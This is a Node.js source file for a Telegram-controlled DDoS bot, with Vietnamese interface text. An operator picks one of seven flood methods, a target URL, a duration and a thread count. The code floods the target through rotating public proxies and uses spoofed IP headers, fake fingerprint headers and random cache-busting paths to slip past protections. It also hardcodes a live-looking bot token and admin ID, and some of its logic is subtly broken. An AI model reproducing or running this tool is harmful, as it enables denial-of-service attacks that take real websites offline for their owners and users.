const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const https = require('https');
const http = require('http');
const tls = require('tls');
const net = require('net');
const crypto = require('crypto');
const puppeteer = require('puppeteer');
const { SocksProxyAgent } = require('socks-proxy-agent');
const { HttpsProxyAgent } = require('https-proxy-agent');

const TOKEN = '8270861587:AAEsK2BT4kwHfX0xfu97sNDm8U6vYfcehwk';
const ADMIN_ID = 6142661532;

const bot = new TelegramBot(TOKEN, { polling: true });

let activeAttacks = new Map();
let attackCounter = 0;
let proxyList = [];
let userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
];

function loadProxies() {
    try {
        const response = axios.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all');
        proxyList = response.data.split('\n').filter(p => p.trim()).map(p => ({ http: `http://${p.trim()}`, https: `http://${p.trim()}` }));
        if (!proxyList.length) proxyList = [null];
    } catch (e) {
        proxyList = [null];
    }
}
loadProxies();
setInterval(loadProxies, 60000);

function getRandomProxy() {
    return proxyList.length ? proxyList[Math.floor(Math.random() * proxyList.length)] : null;
}

function generateJa3Fingerprint() {
    const ja3Str = `${Math.floor(Math.random() * (772 - 769 + 1) + 769)},${Math.floor(Math.random() * 65536)}-${Math.floor(Math.random() * 65536)}-${Math.floor(Math.random() * 65536)},${Math.floor(Math.random() * 65536)}-${Math.floor(Math.random() * 65536)}-${Math.floor(Math.random() * 65536)},${Math.floor(Math.random() * 65536)}-${Math.floor(Math.random() * 65536)}-${Math.floor(Math.random() * 65536)}`;
    return crypto.createHash('md5').update(ja3Str).digest('hex');
}

function getRandomPayload() {
    return crypto.randomBytes(1024).toString('hex');
}

async function floodAttack(url, duration, threads) {
    const parsed = new URL(url);
    const target = `${parsed.protocol}//${parsed.host}`;
    const path = parsed.pathname + parsed.search;
    const endTime = Date.now() + duration * 1000;
    let requests = 0;

    const floodWorker = async () => {
        const proxy = getRandomProxy();
        const agent = proxy ? new HttpsProxyAgent(proxy.https) : undefined;
        while (Date.now() < endTime) {
            try {
                await axios({
                    method: 'GET',
                    url: url,
                    headers: {
                        'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Cache-Control': 'no-cache',
                        'Pragma': 'no-cache'
                    },
                    httpsAgent: agent,
                    httpAgent: agent,
                    timeout: 3000
                }).catch(() => {});
                requests++;
            } catch (e) {}
        }
    };
    const workers = [];
    for (let i = 0; i < threads; i++) workers.push(floodWorker());
    await Promise.all(workers);
    return requests;
}

async function httpsAttack(url, duration, threads) {
    const parsed = new URL(url);
    const endTime = Date.now() + duration * 1000;
    let requests = 0;

    const httpsWorker = () => {
        return new Promise((resolve) => {
            const proxy = getRandomProxy();
            const agent = proxy ? new HttpsProxyAgent(proxy.https) : undefined;
            const req = (callback) => {
                if (Date.now() >= endTime) return callback();
                const options = {
                    hostname: parsed.hostname,
                    port: parsed.port || 443,
                    path: parsed.pathname + parsed.search,
                    method: 'GET',
                    headers: {
                        'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
                        'Accept': '*/*',
                        'Connection': 'keep-alive'
                    },
                    agent: agent,
                    rejectUnauthorized: false
                };
                const req = https.request(options, (res) => {
                    res.on('data', () => {});
                    res.on('end', () => {
                        requests++;
                        setImmediate(() => req(callback));
                    });
                });
                req.on('error', () => setImmediate(() => req(callback)));
                req.end();
            };
            req(() => resolve());
        });
    };
    const workers = [];
    for (let i = 0; i < threads; i++) workers.push(httpsWorker());
    await Promise.all(workers);
    return requests;
}

async function tlsAttack(url, duration, threads) {
    const parsed = new URL(url);
    const endTime = Date.now() + duration * 1000;
    let connections = 0;

    const tlsWorker = () => {
        return new Promise((resolve) => {
            const connect = () => {
                if (Date.now() >= endTime) return resolve();
                const socket = net.connect(parsed.port || 443, parsed.hostname, () => {
                    const tlsSocket = tls.connect({
                        socket: socket,
                        servername: parsed.hostname,
                        rejectUnauthorized: false,
                        ciphers: 'ALL',
                        secureProtocol: 'TLSv1_2_method'
                    });
                    tlsSocket.on('secureConnect', () => {
                        tlsSocket.write(`GET ${parsed.pathname}${parsed.search} HTTP/1.1\r\nHost: ${parsed.hostname}\r\nUser-Agent: ${userAgents[Math.floor(Math.random() * userAgents.length)]}\r\n\r\n`);
                        connections++;
                        setTimeout(() => {
                            tlsSocket.destroy();
                            setImmediate(connect);
                        }, 100);
                    });
                    tlsSocket.on('error', () => setImmediate(connect));
                });
                socket.on('error', () => setImmediate(connect));
            };
            connect();
        });
    };
    const workers = [];
    for (let i = 0; i < threads; i++) workers.push(tlsWorker());
    await Promise.all(workers);
    return connections;
}

async function bypassAttack(url, duration, threads) {
    const parsed = new URL(url);
    const endTime = Date.now() + duration * 1000;
    let requests = 0;

    const bypassWorker = async () => {
        while (Date.now() < endTime) {
            const proxy = getRandomProxy();
            const agent = proxy ? new HttpsProxyAgent(proxy.https) : undefined;
            const ja3 = generateJa3Fingerprint();
            const headers = {
                'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Cache-Control': 'max-age=0',
                'TE': 'Trailers',
                'X-Forwarded-For': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
                'X-Real-IP': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
                'X-JA3-Fingerprint': ja3
            };
            try {
                await axios.get(url, { headers, httpsAgent: agent, httpAgent: agent, timeout: 5000 });
                requests++;
            } catch (e) {}
        }
    };
    const workers = [];
    for (let i = 0; i < threads; i++) workers.push(bypassWorker());
    await Promise.all(workers);
    return requests;
}

async function browserAttack(url, duration, threads) {
    const endTime = Date.now() + duration * 1000;
    let pagesLoaded = 0;
    const launchBrowser = async () => {
        const browser = await puppeteer.launch({ headless: true, args: ['--no-sandbox', '--disable-setuid-sandbox'] });
        const page = await browser.newPage();
        await page.setUserAgent(userAgents[Math.floor(Math.random() * userAgents.length)]);
        while (Date.now() < endTime) {
            try {
                await page.goto(url, { waitUntil: 'networkidle2', timeout: 10000 });
                pagesLoaded++;
                await page.waitForTimeout(100);
            } catch (e) {}
        }
        await browser.close();
    };
    const workers = [];
    for (let i = 0; i < threads; i++) workers.push(launchBrowser());
    await Promise.all(workers);
    return pagesLoaded;
}

async function stormAttack(url, duration, threads) {
    const parsed = new URL(url);
    const endTime = Date.now() + duration * 1000;
    let requests = 0;
    const stormWorker = () => {
        return new Promise((resolve) => {
            const worker = () => {
                if (Date.now() >= endTime) return resolve();
                const proxy = getRandomProxy();
                const agent = proxy ? new HttpsProxyAgent(proxy.https) : undefined;
                const req = http.request({
                    hostname: parsed.hostname,
                    port: parsed.port || 80,
                    path: parsed.pathname + parsed.search,
                    method: 'GET',
                    headers: { 'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)] },
                    agent: agent
                }, (res) => {
                    res.resume();
                    requests++;
                    setImmediate(worker);
                });
                req.on('error', () => setImmediate(worker));
                req.end();
            };
            worker();
        });
    };
    const workers = [];
    for (let i = 0; i < threads; i++) workers.push(stormWorker());
    await Promise.all(workers);
    return requests;
}

async function breakAttack(url, duration, threads) {
    const parsed = new URL(url);
    const endTime = Date.now() + duration * 1000;
    let requests = 0;
    const breakWorker = () => {
        return new Promise((resolve) => {
            const worker = () => {
                if (Date.now() >= endTime) return resolve();
                const proxy = getRandomProxy();
                const agent = proxy ? new HttpsProxyAgent(proxy.https) : undefined;
                const randomPath = `/${crypto.randomBytes(8).toString('hex')}`;
                const options = {
                    hostname: parsed.hostname,
                    port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
                    path: randomPath,
                    method: 'GET',
                    headers: {
                        'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
                        'Cache-Control': 'no-cache, no-store, must-revalidate',
                        'Pragma': 'no-cache',
                        'Expires': '0',
                        'X-Cache-Buster': crypto.randomBytes(16).toString('hex')
                    },
                    agent: agent,
                    rejectUnauthorized: false
                };
                const req = (parsed.protocol === 'https:' ? https : http).request(options, (res) => {
                    res.resume();
                    requests++;
                    setImmediate(worker);
                });
                req.on('error', () => setImmediate(worker));
                req.end();
            };
            worker();
        });
    };
    const workers = [];
    for (let i = 0; i < threads; i++) workers.push(breakWorker());
    await Promise.all(workers);
    return requests;
}

function createMethodButtons() {
    return [
        [{ text: 'flood', callback_data: 'method_flood' }, { text: 'https', callback_data: 'method_https' }, { text: 'tls', callback_data: 'method_tls' }],
        [{ text: 'bypass', callback_data: 'method_bypass' }, { text: 'browser', callback_data: 'method_browser' }, { text: 'storm', callback_data: 'method_storm' }],
        [{ text: 'break', callback_data: 'method_break' }]
    ];
}

bot.onText(/\/start/, (msg) => {
    if (msg.from.id !== ADMIN_ID) return;
    const keyboard = {
        inline_keyboard: createMethodButtons()
    };
    bot.sendMessage(msg.chat.id, '*╔══════════════════════════╗*\n*║       BOT ĐÃ SẴN SÀNG      ║*\n*╚══════════════════════════╝*\n\n*Chọn phương thức tấn công:*', {
        parse_mode: 'Markdown',
        reply_markup: keyboard
    });
});

bot.on('callback_query', async (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    if (msg.from.id !== ADMIN_ID) return;
    if (data.startsWith('method_')) {
        const method = data.split('_')[1];
        bot.sendMessage(msg.chat.id, `*╔══════════════════════════╗*\n*║  ĐÃ CHỌN METHOD: ${method.toUpperCase()}  ║*\n*╚══════════════════════════╝*\n\n*Gửi URL cần tấn công:*`, { parse_mode: 'Markdown' });
        bot.once('message', async (urlMsg) => {
            if (urlMsg.from.id !== ADMIN_ID) return;
            const url = urlMsg.text.trim();
            if (!url.startsWith('http')) {
                bot.sendMessage(msg.chat.id, '*URL không hợp lệ!*', { parse_mode: 'Markdown' });
                return;
            }
            bot.sendMessage(msg.chat.id, `*╔══════════════════════════╗*\n*║    NHẬP THỜI GIAN (giây)   ║*\n*╚══════════════════════════╝*`, { parse_mode: 'Markdown' });
            bot.once('message', async (durationMsg) => {
                if (durationMsg.from.id !== ADMIN_ID) return;
                const duration = parseInt(durationMsg.text);
                if (isNaN(duration) || duration <= 0) {
                    bot.sendMessage(msg.chat.id, '*Thời gian không hợp lệ!*', { parse_mode: 'Markdown' });
                    return;
                }
                bot.sendMessage(msg.chat.id, `*╔══════════════════════════╗*\n*║    NHẬP SỐ LUỒNG (threads)   ║*\n*╚══════════════════════════╝*`, { parse_mode: 'Markdown' });
                bot.once('message', async (threadsMsg) => {
                    if (threadsMsg.from.id !== ADMIN_ID) return;
                    let threads = parseInt(threadsMsg.text);
                    if (isNaN(threads) || threads <= 0) threads = 50;
                    const attackId = ++attackCounter;
                    activeAttacks.set(attackId, { method, url, duration, threads, active: true });
                    bot.sendMessage(msg.chat.id, `*╔══════════════════════════╗*\n*║  BẮT ĐẦU TẤN CÔNG ${method.toUpperCase()}  ║*\n*╚══════════════════════════╝*\n\nURL: ${url}\nThời gian: ${duration} giây\nLuồng: ${threads}`, { parse_mode: 'Markdown' });
                    let result;
                    switch (method) {
                        case 'flood': result = await floodAttack(url, duration, threads); break;
                        case 'https': result = await httpsAttack(url, duration, threads); break;
                        case 'tls': result = await tlsAttack(url, duration, threads); break;
                        case 'bypass': result = await bypassAttack(url, duration, threads); break;
                        case 'browser': result = await browserAttack(url, duration, threads); break;
                        case 'storm': result = await stormAttack(url, duration, threads); break;
                        case 'break': result = await breakAttack(url, duration, threads); break;
                        default: result = 0;
                    }
                    activeAttacks.delete(attackId);
                    bot.sendMessage(msg.chat.id, `*╔══════════════════════════╗*\n*║    KẾT THÚC TẤN CÔNG    ║*\n*╚══════════════════════════╝*\n\nTổng số yêu cầu: ${result}\nPhương thức: ${method.toUpperCase()}`, { parse_mode: 'Markdown' });
                });
            });
        });
    }
});

bot.onText(/\/status/, (msg) => {
    if (msg.from.id !== ADMIN_ID) return;
    const active = Array.from(activeAttacks.values());
    let statusText = '*╔══════════════════════════╗*\n*║        TRẠNG THÁI        ║*\n*╚══════════════════════════╝*\n\n';
    if (active.length === 0) {
        statusText += '*Không có cuộc tấn công nào đang chạy.*';
    } else {
        for (let i = 0; i < active.length; i++) {
            const a = active[i];
            statusText += `*[${i+1}]* ${a.method.toUpperCase()} | ${a.url} | ${a.duration}s | ${a.threads} luồng\n`;
        }
    }
    bot.sendMessage(msg.chat.id, statusText, { parse_mode: 'Markdown' });
});

bot.onText(/\/stop/, (msg) => {
    if (msg.from.id !== ADMIN_ID) return;
    activeAttacks.clear();
    bot.sendMessage(msg.chat.id, '*╔══════════════════════════╗*\n*║    ĐÃ DỪNG TẤT CẢ ATTACK   ║*\n*╚══════════════════════════╝*', { parse_mode: 'Markdown' });
});

console.log('Bot đã khởi động');

// flood, https, tls, bypass, browser, storm, break